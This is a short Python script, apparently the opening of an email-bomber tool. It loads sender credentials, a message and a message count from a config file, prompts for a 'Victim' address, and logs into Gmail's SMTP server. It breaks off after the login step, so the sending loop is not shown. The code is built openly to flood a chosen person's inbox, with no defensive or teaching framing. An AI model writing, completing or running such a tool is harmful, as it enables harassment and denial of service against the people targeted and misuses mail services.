import os, sys, time, json, smtplib

with open('config.json') as f:
    config = json.load(f)
email = config.get('email')
password = config.get('password')
message = config.get('message')
number = config.get('amount')

victim = input(' [?] Victim: ')

class SMTP():
    def __init__(self):
        self.email = email
        self.password = password
        self.victim = victim
        self.message = message
        self.number = number
    
    def verify(self):
        server1 = smtplib.SMTP('smtp.gmail.com', 587) # change this to any smtp server you want
        server1.ehlo()
        server1.starttls()

        try:
            server1.login(self.email, self.password)
        except smtplib.SMTPAuthenticationError:
            print('\n [!] The email or password is wrong\n [!] Make sure lesssecureapps is turned on')
            input()